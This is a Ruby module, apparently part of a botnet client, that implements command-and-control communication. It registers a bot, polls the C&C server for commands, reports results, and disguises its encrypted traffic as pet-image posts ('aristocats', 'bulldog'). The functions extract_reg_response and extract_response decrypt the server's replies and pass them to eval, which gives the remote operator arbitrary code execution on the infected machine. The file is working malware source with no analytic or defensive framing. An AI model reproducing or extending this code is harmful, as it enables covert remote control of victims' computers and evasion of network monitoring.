# frozen_string_literal: true

# Communication with C&C
module CommandsHelper
  include CryptHelper
  include OffuscateHelper

  def register_bot(payload)
    headers = {
      content_type: :json, accept: :json, marker: MARKER
    }

    response = RestClient::Request.execute(
      method: :post,
      url: "#{REGISTER_URI}/#{REGISTER_POOL}",
      timeout: 10,
      headers: headers,
      payload: payload
    )

    cypher_settings = JSON.parse(response.body)
    extract_reg_response(cypher_settings) if cypher_settings.present?

  rescue RestClient::ExceptionWithResponse => e
    CustomError.new(code: CustomError::FATAL, msg: e.response)
  rescue StandardError => e
    CustomError.new(code: CustomError::FATAL, msg: e)
  end

  def pull_command
    info = {
      action: 'GET_COMMANDS'
    }

    response = RestClient::Request.execute(
      method: :post,
      url: "#{Parameter.c_c_uri}/#{Parameter.c_c_pool}",
      timeout: 10,
      headers: get_headers,
      payload: get_cc_payload(info)
    )

    cipher_response = JSON.parse(response.body)
    extract_response(cipher_response) if cipher_response.present?

  rescue RestClient::ExceptionWithResponse => e
    CustomError.new(code: CustomError::FATAL, msg: e.response)
  rescue StandardError => e
    CustomError.new(msg: e)
  end

  def echo
    info = {
      action: 'ECHO'
    }

    response = RestClient::Request.execute(
      method: :post,
      url: "#{Parameter.c_c_uri}/#{Parameter.c_c_pool}",
      timeout: 10,
      headers: get_headers,
      payload: get_cc_payload(info)
    )

    JSON.parse(response.body)

  rescue RestClient::ExceptionWithResponse => e
    CustomError.new(code: CustomError::FATAL, msg: e.response)
  rescue StandardError => e
    CustomError.new(code: CustomError::FATAL, msg: e)
  end

  def report_activity(success: false, result: '', identifier: commands['id'], action: nil, error_code: nil, error_msg: nil)
    info = {
      action: 'REPORT_COMMANDS',
      result: {
        status: success ? 'SUCCESS' : 'FAIL',
        content_result: result,
        identifier: identifier,
        command: action,
        error_details: {
          code: error_code,
          msg: error_msg
        }
      }
    }

    RestClient::Request.execute(
      method: :post,
      url: "#{Parameter.c_c_uri}/#{Parameter.c_c_pool}",
      timeout: 10,
      headers: get_headers,
      payload: get_cc_payload(info)
    )

  rescue RestClient::ExceptionWithResponse => e
    CustomError.new(code: CustomError::FATAL, msg: e.response)
  rescue StandardError => e
    CustomError.new(code: CustomError::FATAL, msg: e)
  end

  def get_reg_payload(plain_info)
    if DISABLE_ENCRIPTION
      image = plain_info.to_s
      url = facade_image_link(REGISTER_URI, REGISTER_POOL)
    else
      result = encrypt(plain_info.to_s, CIPHER_KEY, CIPHER_IV)
      image = result[:ciphertext]
      url = ofuscate_image_link(result[:tag], REGISTER_URI, REGISTER_POOL)
    end

    {
      name: "aristocats #{rand(9000)}",
      image: image,
      url: url
    }
  end

  def get_cc_payload(plain_info)
    result = encrypt(plain_info.to_s, Parameter.c_c_cipher_key, Parameter.c_c_cipher_iv)
    image = result[:ciphertext]
    url = ofuscate_image_link(result[:tag], Parameter.c_c_uri, Parameter.c_c_pool)

    {
      name: "bulldog #{rand(900000)}",
      image: image,
      url: url
    }
  end

  def extract_reg_response(cipher_response)
    tag = unofuscate_image_link(cipher_response['article']['url'], REGISTER_POOL)
    plain_info = decrypt(cipher_response['article']['image'], tag, CIPHER_KEY, CIPHER_IV)
    eval(plain_info)
  end

  def extract_response(cipher_response)
    tag = unofuscate_image_link(cipher_response['article']['url'], Parameter.c_c_pool)
    plain_info = decrypt(cipher_response['article']['image'], tag, Parameter.c_c_cipher_key, Parameter.c_c_cipher_iv)
    eval(plain_info)
  end

  def get_headers
    {
      content_type: :json, accept: :json, dog_descriptor: Parameter.c_c_token
    }
  end
end
